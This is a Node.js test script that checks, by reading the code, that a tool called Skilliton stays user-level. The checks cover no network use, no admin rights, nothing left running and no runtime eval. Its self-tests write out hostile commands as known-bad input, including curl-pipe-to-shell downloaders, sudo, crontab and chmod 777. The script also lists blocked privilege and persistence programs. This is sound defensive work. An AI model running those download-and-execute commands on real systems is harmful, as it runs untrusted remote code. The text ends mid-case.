#!/usr/bin/env node
// footprint.test.mjs: Skilliton stays small enough for a locked-down laptop (backlog B28).
//
// docs/IT-ALLOWLIST.md opens with four promises to an IT team: user-level only, no executables of its own and nothing
// downloaded to run, no web requests of its own, and nothing left running. Those were true by inspection when the page
// was written. These rules keep them true, by reading the code rather than the page (scripts/inventory.mjs):
//
//   network      no network module, no fetch, no downloader, and no git command that contacts a remote, unless
//                ALLOWED_NETWORK names it with the reason and the page says so too
//   privileges   nothing that asks for administrator rights: sudo and its kin, changing an owner, setuid or setgid
//   nothing left running  no program that installs a service, an agent, a scheduled task or a login item
//   system paths every absolute path outside a home folder or a repository is listed below with what it is for, and
//                nothing writes to one
//   plain files  every file shipped inside the plugins is text, every file the repository marks executable starts
//                with a shebang, and no code makes a downloaded file executable
//   no code built at run time  no eval, no new Function, no node:vm, and every dynamic import comes from a fixed
//                module path (each call site listed below with how many there are)
//   file modes   every mode a file or folder is created with is one the product uses, so nothing is world-writable
//                or setuid
//
// Where the machine is written is measured by scripts/allowlist.test.mjs, which runs the commands and hooks in an
// empty home folder; this file reads the code for what such a run would never reach.
//
//   node scripts/footprint.test.mjs              exit 0 when every rule holds, 1 when one does not, 2 when a rule could not run
//   node scripts/footprint.test.mjs --self-test  proves each rule fails on known-bad input

import { spawnSync } from "node:child_process";
import { lstatSync, mkdtempSync, readFileSync, readdirSync, rmSync, statSync, symlinkSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { NETWORK_PROGRAMS, REPO, SHELL_BUILTINS, jsProgramCalls, networkUses, scopeFiles, shellCommands } from "./inventory.mjs";

const PLUGINS = "packs/base/plugins";
// The functions that run the program their caller names; scripts/allowlist.test.mjs reads their call sites in full.
const WRAPPERS = ["runProgram", "runClient"];
const GIT_WRAPPERS = { [`${PLUGINS}/guardrails/hooks/guard-bash.sh`]: ["g"] };

// Network use that is allowed, each with the reason and the words docs/IT-ALLOWLIST.md must carry. Empty means the
// code reaches no network at all, which is what the page claims today.
export const ALLOWED_NETWORK = [
  { file: `${PLUGINS}/workflow/runtime/lib/preflight.mjs`, text: '"ls-remote"', why: "the preflight check asks whether this machine can reach the company's plugin repository, which is the check a locked-down laptop needs most" },
];

// Programs that would need administrator rights, or would leave something running after the command exits.
const PRIVILEGE_PROGRAMS = ["sudo", "su", "doas", "pkexec", "runas", "chown", "chgrp", "sudoedit"];
const PERSISTENCE_PROGRAMS = ["launchctl", "systemctl", "systemd-run", "crontab", "at", "batch", "schtasks", "sc", "reg", "regedit", "osascript", "defaults", "wscript", "cscript", "powershell", "pwsh", "atrm", "update-rc.d", "service", "nohup", "setsid", "disown", "screen", "tmux"];
const PRIVILEGE_PATTERNS = [
  [/process\.set(uid|gid|groups)\s*\(/, "changing the user or group the process runs as"],
  [/\bsetuid\b|\bsetgid\b|chmod\s+[ug]\+s|\b0o?[24]\d{3}\b/, "a setuid or setgid bit"],
  [/-Verb\s+RunAs|with\s+administrator\s+privileges|Start-Process\s+.*RunAs/i, "asking for administrator rights"],
];
// The option that puts a child in its own process group, however it is written.
const DETACHED = /(["']?)detached\1\s*[:=]|[{,]\s*detached\s*[,}]|\[\s*["']detached["']\s*\]/;
const PERSISTENCE_PATTERNS = [
  [/LaunchAgents|LaunchDaemons|StartupItems|\/etc\/(systemd|init\.d|rc\.local|cron)|\.config\/autostart|CurrentVersion\\\\?Run|Start Menu.*Startup/i, "a place that starts programs by itself"],
  [/\.unref\s*\??\.?\s*\(/, "something let go on purpose (a child process, a socket or a timer); a child let go this way outlives the command, so this line has to say which it is"],
  [/(["']?)detached\1\s*[:=]\s*true/, "a child process started in its own group and not waited for"],
];
// Where a child process is deliberately put in its own group, and why. Each of these waits for the child and kills
// the group if it has to, which is the opposite of letting something outlive the command.
// Each of these starts the child asynchronously, keeps hold of it, and kills the group when a timeout passes or the
// command is interrupted: scripts/preflight.test.mjs proves the last one against a program that ignores being asked
// to stop, and scripts/collectors.test.mjs the first. A synchronous start cannot make that promise, so a new entry
// here needs the same shape. The count is of every mention of the word in the file, so a second start cannot hide
// behind the first; what it does is read by a person when the count changes, and by the tests named above.
export const PROCESS_GROUPS = [
  [`${PLUGINS}/workflow/runtime/lib/collectors.mjs`, 1, "a policy's test command, so a timeout can stop the whole group"],
  [`${PLUGINS}/workflow/runtime/lib/delivery.mjs`, 1, "the same, in the delivery gate"],
  [`${PLUGINS}/workflow/runtime/lib/gate.mjs`, 2, "the same, in skilliton gate (one start for a policy check's argument list, one for a command run through the shell), so a test runner's workers go when the check is stopped"],
  [`${PLUGINS}/workflow/runtime/lib/preflight.mjs`, 1, "one program being checked, so a program that hangs is taken away with its children"],
];

// Absolute paths outside a home folder or a repository that the code may name, and what each is for. Nothing here is
// written: they are read, run, or used as the null device. The first line of a script (#!/usr/bin/env bash) is a
// comment to this reader; scripts/allowlist.test.mjs reads those instead.
export const SYSTEM_PATHS = [
  ["/dev/null", "the null device, for output nobody reads"],
  ["/usr/bin/python3", "checks whether python3 on a Mac is the developer-tools stub before using it as a JSON reader"],
  ["/usr/bin/xcode-select", "the same check, run only when python3 is that path"],
  ["/usr/bin", "half of the PATH a delivery check falls back to when the server's environment has none"],
  ["/bin", "the other half of that fallback"],
  ["/bin/sh", "the first line of the launcher join writes and of the delivery gate's hook"],
];
const SYSTEM_PATH_RE = /(?<![A-Za-z0-9._~-])\/(etc|usr|bin|sbin|opt|Library|System|var|private|Applications|dev|tmp|Volumes|proc|root)(\/[A-Za-z0-9._/-]*)?|(?<![A-Za-z0-9])[A-Za-z]:\\\\(?:Program|Windows|Users)/g;
const WRITE_CALLS = /\b(writeFileSync|appendFileSync|mkdirSync|copyFileSync|renameSync|rmSync|unlinkSync|chmodSync|openSync|createWriteStream)\s*\(\s*["'`]([^"'`]+)["'`]/g;

// Every dynamic import in the code: where it comes from, and how many there are, so a new one has to be looked at.
export const DYNAMIC_IMPORTS = [
  [`${PLUGINS}/workflow/runtime/skilliton.mjs`, 2, "the command module for a name this file itself lists, and its own core library"],
  [`${PLUGINS}/workflow/runtime/lib/lifecycle.mjs`, 1, "the runtime beside this file, to read a project's state"],
  [`${PLUGINS}/workflow/runtime/lib/prepare.mjs`, 1, "a migration module from the runtime's own folder"],
  [`${PLUGINS}/workflow/runtime/lib/release.mjs`, 1, "the migrations module beside it"],
  [`${PLUGINS}/workflow/runtime/commands/migrate.mjs`, 1, "the collectors module beside it"],
];
const RUNTIME_CODE_PATTERNS = [
  [/(?<![\w.])eval\s*\(|globalThis\s*\.\s*eval\b/, "eval"],
  [/new\s+Function\s*\(|Reflect\.construct\s*\(\s*Function/, "a function built from text"],
  [/["'](?:node:)?vm["']/, "the vm module"],
  [/process\.binding\s*\(/, "process.binding"],
  [/createRequire\s*\(/, "a module loader built at run time"],
];

// File modes the product creates things with, and the two masks it reads bits with.
const CREATE_MODES = { "0o600": "a private file", "0o644": "a file anyone may read", "0o700": "a private folder", "0o755": "a program anyone may run" };
const MASKS = { "0o777": "reading the permission bits of a file", "0o111": "reading whether a file is executable" };

const FILE_FLOOR = 100;
// Every rule below reads through this one function, and it never throws. A file that cannot be read (a link
// pointing nowhere, a mode this user may not read, a file removed while the check ran) is recorded and reported as
// its own problem at the end of the run. A reader that throws out of the middle of a rule leaves every later rule
// unrun while the command looks like it failed for one reason, and an unreadable file under the plugins is itself
// worth knowing about: whatever it names is hidden from every check here.
function makeReader(root, seen) {
  const reader = (path) => {
    try {
      // Checked before it is opened: reading a pipe or a device never returns, and a check that hangs is worse than
      // one that fails, because nothing says what it was waiting for.
      const st = statSync(join(root, path));
      if (!st.isFile()) { seen.set(path, "not a plain file"); return ""; }
      return readFileSync(join(root, path), "utf8");
    } catch (e) { seen.set(path, e.code ?? e.message); return ""; }
  };
  reader.unreadable = seen; // so a caller handed this reader can ask what it could not read
  return reader;
}
const unreadable = new Map();
const read = makeReader(REPO, unreadable);

export function checkUnreadable(seen = unreadable, notRegular = []) {
  return [...notRegular.map((n) => `${n.path} was not read because ${n.why}`), ...[...seen].map(([path, why]) => `${path} could not be read (${why}), so no rule here could check what it starts, writes or loads`)];
}
// True when the text of an options object spreads something into its own top level ({ ...OPTIONS, stdio: "ignore" }).
// A spread inside a value, such as env: { ...gitEnvironment(), ...extra }, is not this: the options themselves are
// still written where they can be read.
export function topLevelSpread(text) {
  // Strings and comments first: three dots inside either of them are text, not a spread, and a rule that says
  // otherwise puts a name on a line that is doing nothing of the kind.
  const t = String(text)
    .replace(/\/\*[\s\S]*?\*\//g, " ")
    .replace(/\/\/[^\n]*/g, " ")
    .replace(/"(?:\\.|[^"\\])*"|'(?:\\.|[^'\\])*'|`(?:\\.|[^`\\])*`/g, '""')
    .trim();
  if (!t.startsWith("{")) return false;
  let depth = 0;
  for (let i = 0; i < t.length; i++) {
    const c = t[i];
    if (c === "{" || c === "[" || c === "(") depth++;
    else if (c === "}" || c === "]" || c === ")") depth--;
    else if (depth === 1 && c === "." && t.startsWith("...", i)) return true;
  }
  return false;
}

const codeLines = (text) => text.split("\n").map((line, i) => ({ line, number: i + 1 })).filter(({ line }) => !/^\s*(\/\/|#|\*)/.test(line));

// ---------- the rules ----------

export function checkNetwork(files, readFile, allowed = ALLOWED_NETWORK) {
  return networkUses(files, readFile, GIT_WRAPPERS)
    .filter((hit) => !allowed.some((a) => a.file === hit.path && hit.text.includes(a.text)))
    .map((hit) => `${hit.path}:${hit.line} uses ${hit.what} (${hit.text}); Skilliton makes no requests of its own, so this needs an entry in ALLOWED_NETWORK with its reason and a line in docs/IT-ALLOWLIST.md section 4`);
}

export function checkPrivileges(files, readFile, groups = PROCESS_GROUPS) {
  const violations = [];
  const seen = new Map();
  for (const path of [...files.js, ...files.shell]) {
    const text = readFile(path);
    for (const { line, number } of codeLines(text)) {
      // A line that starts a child in its own group is counted, and still read by every other rule: a rule that let
      // a line skip the others would be a place to hide one.
      // Every way of writing the option counts: `detached:`, `"detached":`, `detached =`, shorthand ({ detached }),
      // and a computed key. The word in prose ("a detached HEAD") does not, which is why this is not a bare word match.
      if (DETACHED.test(line)) seen.set(path, (seen.get(path) ?? 0) + 1);
      for (const [re, what] of [...PRIVILEGE_PATTERNS, ...PERSISTENCE_PATTERNS]) {
        if (re.test(line)) violations.push(`${path}:${number} has ${what} (${line.trim().slice(0, 120)}); Skilliton is user-level only and leaves nothing running`);
      }
    }
    if (!files.shell.includes(path)) continue;
    const { commands, functions } = shellCommands(text);
    for (const c of commands) {
      const program = c.word.split("/").pop();
      // A command left running in the background outlives the hook that started it, which is the promise this rule
      // holds: hooks and commands exit when they are done.
      if (c.background) violations.push(`${path}:${c.line} leaves ${c.word} running in the background while the script goes on; hooks and commands exit when they are done`);
      if (SHELL_BUILTINS.has(c.word) || functions.includes(c.word)) continue;
      if (PRIVILEGE_PROGRAMS.includes(program)) violations.push(`${path}:${c.line} starts ${c.word}, which needs administrator rights; Skilliton is user-level only`);
      if (PERSISTENCE_PROGRAMS.includes(program)) violations.push(`${path}:${c.line} starts ${c.word}, which can leave something running after the command exits`);
    }
  }
  for (const [path, count, why] of groups) {
    const found = seen.get(path) ?? 0;
    if (found !== count) violations.push(`PROCESS_GROUPS in scripts/footprint.test.mjs expects ${count} child process(es) in their own group in ${path} (${why}), but the file has ${found}; read what changed, because a group that is not waited for outlives the command`);
    seen.delete(path);
  }
  for (const [path, found] of seen) violations.push(`${path} starts ${found} child process(es) in their own process group, which PROCESS_GROUPS in scripts/footprint.test.mjs does not list; say why, or take it out`);
  return violations;
}

// The same rule for the JavaScript side: a program started by name there, such as spawnSync("launchctl", ...).
export function checkStartedPrograms(files, readFile) {
  const violations = [];
  for (const path of files.js) {
    const text = readFile(path);
    // Taking the binding is enough: promisify(exec) never calls exec by name, so a rule that reads call sites alone
    // sees nothing. The runtime starts programs with an argument list, so neither name has any business being here.
    const imported = /import\s*\{([^}]*)\}\s*from\s*["']node:child_process["']/.exec(text)?.[1];
    if (imported && /\b(exec|execSync)\b/.test(imported)) {
      violations.push(`${path} imports ${/\bexecSync\b/.test(imported) ? "execSync" : "exec"} from child_process, which runs a command line through a shell; nothing here can then say what it starts, whether or not it is called by that name (promisify(exec) never is)`);
    }
    for (const call of jsProgramCalls(text, WRAPPERS).calls) {
      // A shell string is not a program list: exec and execSync hand a whole command line to a shell, and what that
      // line starts cannot be read from the code. Every rule here reads program names, so this one has to be refused
      // rather than read.
      if (call.fn === "exec" || call.fn === "execSync") {
        violations.push(`${path}:${call.line} uses ${call.fn}, which hands a whole command line to a shell, so no rule here can say what it starts; start programs with an argument list (execFile, execFileSync, spawn)`);
      }
      // Options handed to a child through a variable cannot be read, and the rules above read exactly these lines.
      // A spread at the top of the options object is the same thing wearing a literal's clothes: { ...OPTIONS } reads
      // as an object while detached, stdio and the rest arrive from somewhere this check never sees.
      if (typeof call.options === "string" && call.options.trim() && !/^[{]/.test(call.options.trim())) {
        violations.push(`${path}:${call.line} starts a child with options from ${call.options.trim().slice(0, 40)}, which this check cannot read; write them where they can be read, so "nothing keeps running" can be checked`);
      } else if (typeof call.options === "string" && topLevelSpread(call.options)) {
        violations.push(`${path}:${call.line} starts a child with options spread from somewhere else (${call.options.trim().slice(0, 40)}), so detached and stdio cannot be read here; write the options out where they can be read`);
      }
      if (!call.program) continue;
      const name = call.program.split("/").pop();
      if (PRIVILEGE_PROGRAMS.includes(name)) violations.push(`${path}:${call.line} starts ${call.program}, which needs administrator rights; Skilliton is user-level only`);
      if (PERSISTENCE_PROGRAMS.includes(name)) violations.push(`${path}:${call.line} starts ${call.program}, which can leave something running after the command exits`);
      if (NETWORK_PROGRAMS.includes(name)) violations.push(`${path}:${call.line} starts ${call.program}, which contacts a network`);
    }
  }
  return violations;
}

export function checkSystemPaths(files, readFile, allowed = SYSTEM_PATHS) {
  const violations = [];
  const names = allowed.map(([p]) => p);
  const used = new Set();
  for (const path of [...files.js, ...files.shell]) {
    const text = readFile(path);
    for (const { line, number } of codeLines(text)) {
      for (const m of line.matchAll(SYSTEM_PATH_RE)) {
        // The most exact entry wins, so /usr/bin/python3 is not counted as a use of the /usr/bin fallback.
        const match = names.filter((p) => m[0] === p || m[0].startsWith(`${p}/`)).sort((a, b) => b.length - a.length)[0];
        if (match) { used.add(match); continue; }
        violations.push(`${path}:${number} names ${m[0]} (${line.trim().slice(0, 120)}), a path outside a home folder and a repository, which SYSTEM_PATHS in scripts/footprint.test.mjs does not list`);
      }
      for (const m of line.matchAll(WRITE_CALLS)) {
        if (/^[\\/]|^[A-Za-z]:\\/.test(m[2]) && m[2] !== "/dev/null") violations.push(`${path}:${number} writes to the absolute path ${m[2]}; Skilliton writes only inside a home folder, a repository and the temporary folder`);
      }
    }
  }
  for (const [path, why] of allowed) {
    if (!used.has(path)) violations.push(`SYSTEM_PATHS in scripts/footprint.test.mjs lists ${path} (${why}), but no file names it any more; remove the entry`);
  }
  return violations;
}

// Every file shipped inside the plugins is text, and every file the repository marks executable starts with a shebang,
// so nothing arrives on a laptop as a binary to run. Uses the git index, which is what a release carries.
export function checkShippedFiles(entries, readBytes) {
  const violations = [];
  for (const { path, mode } of entries) {
    let bytes;
    try { bytes = readBytes(path); } catch (e) { violations.push(`${path} could not be read (${e.message})`); continue; }
    if (bytes.includes(0)) violations.push(`${path} is not a text file; the plugins ship scripts only, so a laptop never receives a binary from Skilliton`);
    const executable = (parseInt(mode, 8) & 0o111) !== 0;
    const shebang = bytes.subarray(0, 2).toString("latin1") === "#!";
    if (executable && !shebang) violations.push(`${path} is marked executable in the repository but does not start with #!; either it is a binary or its first line is wrong`);
    if (!executable && shebang && /\.(sh|bash)$/.test(path)) violations.push(`${path} starts with #! but is not marked executable, so the platform cannot run it by path`);
  }
  return violations;
}

export function checkRuntimeCode(files, readFile, expected = DYNAMIC_IMPORTS) {
  const violations = [];
  const counts = new Map();
  for (const path of files.js) {
    const text = readFile(path);
    for (const { line, number } of codeLines(text)) {
      for (const [re, what] of RUNTIME_CODE_PATTERNS) {
        if (re.test(line)) violations.push(`${path}:${number} uses ${what} (${line.trim().slice(0, 120)}); Skilliton runs no code it builds at run time`);
      }
      // The runtime always writes a dynamic import as `await import(...)`; any other form is reported so a reader
      // looks at it, because the text "import (" also appears in help text this reader cannot tell from code.
      const found = [...line.matchAll(/(?<=\bawait\s{1,4})import\s*\(([^)]*)\)/g)];
      if (found.length) counts.set(path, (counts.get(path) ?? 0) + found.length);
      for (const m of found) {
        if (!/^\s*(pathToFileURL|new URL|["'`.])|\.href\s*$/.test(m[1])) violations.push(`${path}:${number} imports ${m[1].trim()}, which is not a path built from the runtime's own folder`);
      }
      for (const m of line.matchAll(/(?<=[=(,]\s{0,4}|\breturn\s{1,4})import\s*\(/g)) {
        violations.push(`${path}:${number} loads a module without awaiting it (${line.trim().slice(0, 120)}); the runtime writes every dynamic import as await import(<a path in its own folder>)`);
      }
    }
  }
  for (const [path, count, why] of expected) {
    const seen = counts.get(path) ?? 0;
    if (seen !== count) violations.push(`DYNAMIC_IMPORTS in scripts/footprint.test.mjs expects ${count} dynamic import(s) in ${path} (${why}), but it has ${seen}; read what changed`);
    counts.delete(path);
  }
  for (const [path, seen] of counts) violations.push(`${path} has ${seen} dynamic import(s), which DYNAMIC_IMPORTS in scripts/footprint.test.mjs does not list; read what it loads and add it`);
  return violations;
}

export function checkFileModes(files, readFile) {
  const violations = [];
  const allowedShellModes = new Set(["600", "644", "700", "755", "500", "u+x", "+x", "a+x", "u+rw"]);
  for (const path of files.shell) {
    const { commands } = shellCommands(readFile(path));
    for (const c of commands.filter((x) => x.word.split("/").pop() === "chmod")) {
      const mode = c.args.find((a) => a && !a.startsWith("-"));
      if (mode !== undefined && mode !== null && !allowedShellModes.has(mode)) {
        violations.push(`${path}:${c.line} runs chmod ${mode}; the product uses ${[...allowedShellModes].slice(0, 4).join(", ")} only`);
      }
    }
  }
  for (const path of files.js) {
    for (const { line, number } of codeLines(readFile(path))) {
      for (const m of line.matchAll(/0o[0-7]{3,4}/g)) {
        const mode = m[0];
        if (Object.hasOwn(CREATE_MODES, mode)) continue;
        if (Object.hasOwn(MASKS, mode) && line.includes("&")) continue;
        violations.push(`${path}:${number} uses the file mode ${mode} (${line.trim().slice(0, 120)}); the product creates files and folders with ${Object.keys(CREATE_MODES).join(", ")} only`);
      }
    }
  }
  return violations;
}

// ---------- running ----------

// Every file under the plugins and scripts as it is on disk, because that is what a release hashes and what a
// machine installs: a file nobody added to git ships just the same. The mode comes from the git index when the file
// is tracked (that is what a release records) and from the file itself when it is not.
function shippedEntries() {
  const r = spawnSync("git", ["-C", REPO, "ls-files", "-s", "-z", "--", PLUGINS, "scripts"], { encoding: "utf8", maxBuffer: 64 * 1024 * 1024 });
  if (r.status !== 0) return null;
  const indexModes = new Map();
  for (const entry of r.stdout.split("\0").filter(Boolean)) {
    const m = /^(\d{6}) [0-9a-f]+ \d\t([\s\S]*)$/.exec(entry);
    if (m) indexModes.set(m[2], m[1]);
  }
  // The folder as it is on disk, not as git sees it: a release is built from these folders, so a file nobody added,
  // and a file git is told to ignore, ship the same as any other. The mode comes from the index for a tracked file
  // (that is what a release records) and from the file itself otherwise.
  const entries = [];
  for (const dir of [PLUGINS, "scripts"]) {
    for (const path of walkFiles(join(REPO, dir), dir)) {
      const tracked = indexModes.has(path);
      const mode = tracked ? indexModes.get(path) : onDiskMode(join(REPO, path));
      if (IGNORED_ARTEFACTS.includes(path.split("/").pop())) {
        // Skipped as an operating system's own leftover, but not when something has made it runnable: that is no
        // longer a leftover.
        if (parseInt(mode, 8) & 0o111) entries.push({ path, mode, tracked });
        continue;
      }
      entries.push({ path, mode, tracked });
    }
  }
  return entries;
}

// The mode of a file on disk, reading a link as itself: a link that points nowhere still ships.
function onDiskMode(path) {
  try { return `100${(lstatSync(path).mode & 0o777).toString(8)}`; } catch { return "100000"; }
}

// Files an operating system leaves behind, which are not part of the product and are never installed by a client.
const IGNORED_ARTEFACTS = [".DS_Store", "Thumbs.db"];

// Links are not followed: one under the plugins is listed as a file, so the rules below read the link itself rather
// than whatever it points at, which may be outside the folder a release carries.
function walkFiles(dir, prefix, out = []) {
  let names;
  try { names = readdirSync(dir).sort(); }
  catch { return out; } // a folder that cannot be listed is reported by the walker in inventory.mjs, not here
  for (const name of names) {
    if (name === ".git" || name === "node_modules") continue;
    const path = join(dir, name);
    const st = lstatSync(path);
    if (st.isSymbolicLink()) out.push(`${prefix}/${name}`);
    else if (st.isDirectory()) walkFiles(path, `${prefix}/${name}`, out);
    else if (st.isFile()) out.push(`${prefix}/${name}`);
  }
  return out;
}

function main() {
  const files = scopeFiles();
  let failed = 0, notRun = 0;
  const report = (name, violations) => {
    for (const v of violations) console.log(`FAIL ${name}: ${v}`);
    console.log(violations.length ? `${name}: ${violations.length} problem(s)` : `ok   ${name}`);
    failed += violations.length;
  };

  report("no network of its own", checkNetwork(files, read));
  report("no administrator rights, nothing left running", [...checkPrivileges(files, read), ...checkStartedPrograms(files, read)]);
  report("no system paths written", checkSystemPaths(files, read));
  report("no code built at run time", checkRuntimeCode(files, read));
  report("file modes are the ones the product uses", checkFileModes(files, read));
  report("every file could be read", checkUnreadable(unreadable, files.notRegular ?? [])); // last: the rules above fill the list

  const entries = shippedEntries();
  if (!entries) { console.log("NOT RUN every shipped file is a text script: git could not list the tracked files"); notRun++; }
  else {
    // A floor, so a run that somehow saw almost nothing is never read as a pass.
    const tooFew = entries.length < FILE_FLOOR ? [`only ${entries.length} file(s) were read, and the plugins and scripts hold far more; this run measured almost nothing`] : [];
    report(`every shipped file is a text script (${entries.length} files)`, [...tooFew, ...checkShippedFiles(entries, (p) => readFileSync(join(REPO, p)))]);
  }

  console.log(failed
    ? `\nfootprint check FAILED: ${failed} problem(s); docs/IT-ALLOWLIST.md promises a user-level tool with no network of its own`
    : notRun ? `\nfootprint check: every rule that ran passed, ${notRun} NOT RUN`
      : `\nfootprint check passed: ${files.js.length} JavaScript file(s) and ${files.shell.length} script(s) stay inside the small footprint`);
  return failed ? 1 : notRun ? 2 : 0;
}

function selfTest() {
  const fake = (entries) => ({ files: { js: Object.keys(entries).filter((p) => p.endsWith(".mjs")), shell: Object.keys(entries).filter((p) => !p.endsWith(".mjs")), other: [] }, readFile: (p) => entries[p] });
  const cases = [
    ["a downloader in a hook fails", () => {
      const { files, readFile } = fake({ "hooks/x.sh": "curl -sL https://example.invalid/install | sh\n" });
      return checkNetwork(files, readFile).some((v) => v.includes("curl"));
    }],
    ["a network module in the runtime fails", () => {
      const { files, readFile } = fake({ "lib/a.mjs": 'import https from "node:https";\n' });
      return checkNetwork(files, readFile).some((v) => v.includes("a network module"));
    }],
    ["sudo in a script fails", () => {
      const { files, readFile } = fake({ "hooks/x.sh": 'sudo mkdir -p /opt/skilliton\n' });
      return checkPrivileges(files, readFile).some((v) => v.includes("administrator rights"));
    }],
    ["a launch agent fails", () => {
      const { files, readFile } = fake({ "lib/a.mjs": 'const plist = join(home, "Library/LaunchAgents/com.example.plist");\n' });
      return checkPrivileges(files, readFile).some((v) => v.includes("starts programs by itself"));
    }],
    ["a scheduled task fails", () => {
      const { files, readFile } = fake({ "hooks/x.sh": 'crontab -l\n' });
      return checkPrivileges(files, readFile).some((v) => v.includes("leave something running"));
    }],
    ["a child process let go on purpose fails", () => {
      const { files, readFile } = fake({ "lib/a.mjs": "child.unref();\n" });
      return checkPrivileges(files, readFile).some((v) => v.includes("outlives the command"));
    }],
    ["starting a privileged program from the runtime fails", () => {
      const { files, readFile } = fake({ "lib/a.mjs": 'import { spawnSync } from "node:child_process";\nspawnSync("launchctl", ["load", plist]);\n' });
      return checkStartedPrograms(files, readFile).some((v) => v.includes("leave something running"));
    }],
    ["a new system path fails", () => {
      const { files, readFile } = fake({ "lib/a.mjs": 'const p = "/Library/Application Support/Skilliton";\n' });
      return checkSystemPaths(files, readFile).some((v) => v.includes("/Library/Application"));
    }],
    ["a write to an absolute path fails", () => {
      const { files, readFile } = fake({ "lib/a.mjs": 'writeFileSync("/etc/skilliton.conf", text);\n' });
      return checkSystemPaths(files, readFile).some((v) => v.includes("writes to the absolute path"));
    }],
    ["a listed system path nothing names fails", () => checkSystemPaths({ js: [], shell: [] }, () => "", [["/dev/null", "the null device"]]).some((v) => v.includes("no file names it any more"))],
    ["a binary shipped in the plugins fails", () => checkShippedFiles([{ path: "packs/base/plugins/workflow/bin/tool", mode: "100644" }], () => Buffer.from([0x7f, 0x45, 0x4c, 0x46, 0x00])).some((v) => v.includes("not a text file"))],
    ["an executable file with no shebang fails", () => checkShippedFiles([{ path: "packs/base/plugins/workflow/bin/tool", mode: "100755" }], () => Buffer.from("echo hello\n")).some((v) => v.includes("does not start with #!"))],
    ["a hook script that cannot be run by path fails", () => checkShippedFiles([{ path: "packs/base/plugins/x/hooks/a.sh", mode: "100644" }], () => Buffer.from("#!/usr/bin/env bash\n")).some((v) => v.includes("cannot run it by path"))],
    ["a child process started in its own group that nobody listed fails", () => {
      const { files, readFile } = fake({ "lib/a.mjs": 'spawn(cmd, args, { detached: true, stdio: "ignore" });\n' });
      return checkPrivileges(files, readFile, []).some((v) => v.includes("own process group"));
    }],
    ["a listed process group that is gone fails", () => checkPrivileges({ js: [], shell: [] }, () => "", [["lib/a.mjs", 1, "a test"]]).some((v) => v.includes("but the file has 0"))],
    ["a world-writable mode in a script fails", () => {
      const { files, readFile } = fake({ "hooks/x.sh": 'chmod 777 "$dir"\n' });
      return checkFileModes(files, readFile).some((v) => v.includes("chmod 777"));
    }],
    ["eval reached through globalThis fails", () => {
      const { files, readFile } = fake({ "lib/a.mjs": "const value = globalThis.eval(text);\n" });
      return checkRuntimeCode(files, readFile, []).some((v) => v.includes("uses eval"));
    }],
    ["a module loader built at run time fails", () => {
      const { files, readFile } = fake({ "lib/a.mjs": 'const need = createRequire(import.meta.url);\n' });
      return checkRuntimeCode(files, readFile, []).some((v) => v.includes("module loader"));
    }],
    ["a file that is not tracked is checked too", () => checkShippedFiles([{ path: "packs/base/plugins/workflow/bin/helper", mode: "100755", tracked: false }], () => Buffer.from([0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x00])).some((v) => v.includes("not a text file"))],
    ["eval in the runtime fails", () => {
      const { files, readFile } = fake({ "lib/a.mjs": "const value = eval(text);\n" });
      return checkRuntimeCode(files, readFile, []).some((v) => v.includes("uses eval"));
    }],
    ["an import of something that is not a fixed path fails", () => {
      const { files, readFile } = fake({ "lib/a.mjs": "const mod = await import(config.plugin);\n" });
      return checkRuntimeCode(files, readFile, [["lib/a.mjs", 1, "a test"]]).some((v) => v.includes("not a path built from"));
    }],
    ["a dynamic import nobody listed fails", () => {
      const { files, readFile } = fake({ "lib/a.mjs": 'const mod = await import("./b.mjs");\n' });
      return checkRuntimeCode(files, readFile, []).some((v) => v.includes("does not list"));
    }],
    ["a file that cannot be read is reported rather than stopping the run", () => {
      const dir = mkdtempSync(join(tmpdir(), "footprint-selftest-"));
      try {
        symlinkSync(join(dir, "nowhere.mjs"), join(dir, "gone.mjs"));
        const seen = new Map();
        const reader = makeReader(dir, seen);
        const text = reader("gone.mjs");
        const files = { js: ["gone.mjs"], shell: [], data: [], other: [] };
        return text === "" && seen.get("gone.mjs") === "ENOENT"
          && checkNetwork(files, reader, []).length === 0 // the rules still run over it
          && checkUnreadable(seen).some((v) => v.includes("could not be read (ENOENT)"));
      } finally { rmSync(dir, { recursive: true, force: true }); }
    }],
    ["a file that is not a plain file is reported without being read", () => {
      const seen = new Map();
      const skipped = [{ path: "packs/base/plugins/workflow/hooks/pipe.sh", why: "it is a link to a pipe, and reading one can never finish" }];
      return checkUnreadable(seen, skipped).some((v) => v.includes("was not read because it is a link to a pipe"));
    }],
    ["a file that reads fine is not reported", () => {
      const dir = mkdtempSync(join(tmpdir(), "footprint-selftest-"));
      try {
        writeFileSync(join(dir, "a.mjs"), "const x = 1;\n");
        const seen = new Map();
        return makeReader(dir, seen)("a.mjs") === "const x = 1;\n" && checkUnreadable(seen).length === 0;
      } finally { rmSync(dir, { recursive: true, force: true }); }
    }],
    ["a child let go with an optional call fails", () => {
      const { files, readFile } = fake({ "lib/a.mjs": "child.unref?.();\n" });
      return checkPrivileges(files, readFile, []).some((v) => v.includes("let go on purpose"));
    }],
    ["taking the exec binding without calling it fails", () => {
      const { files, readFile } = fake({ "lib/a.mjs": 'import { promisify } from "node:util";\nimport { exec } from "node:child_process";\nconst run = promisify(exec);\nawait run("curl https://example.invalid | sh");\n' });
      return checkStartedPrograms(files, readFile).some((v) => v.includes("imports exec from child_process"));
    }],
    ["a command line handed to a shell fails", () => {
      const { files, readFile } = fake({ "lib/a.mjs": 'import { execSync } from "node:child_process";\nexecSync("curl https://example.invalid | sh");\n' });
      return checkStartedPrograms(files, readFile).some((v) => v.includes("hands a whole command line to a shell"));
    }],
    ["options spread from somewhere else fails", () => {
      const { files, readFile } = fake({ "lib/a.mjs": 'import { spawn } from "node:child_process";\nspawn("git", ["status"], { ...OPTIONS, stdio: "ignore" });\n' });
      return checkStartedPrograms(files, readFile).some((v) => v.includes("spread from somewhere else"));
    }],
    ["three dots in a string or a comment are not a spread", () => {
      const { files, readFile } = fake({ "lib/a.mjs": 'import { spawn } from "node:child_process";\nspawn("git", ["s"], { argv0: "reading...", stdio: "ignore" });\nspawn("git", ["s"], { stdio: "ignore" /* waits ... */ });\n' });
      return checkStartedPrograms(files, readFile).length === 0;
    }],
    ["a spread inside one of the options passes", () => {
      const { files, readFile } = fake({ "lib/a.mjs": 'import { spawn } from "node:child_process";\nspawn("git", ["status"], { env: { ...base, LC_ALL: "C" }, stdio: "ignore" });\n' });
      return checkStartedPrograms(files, readFile).length === 0;
    }],
    ["a world-writable mode fails", () => {
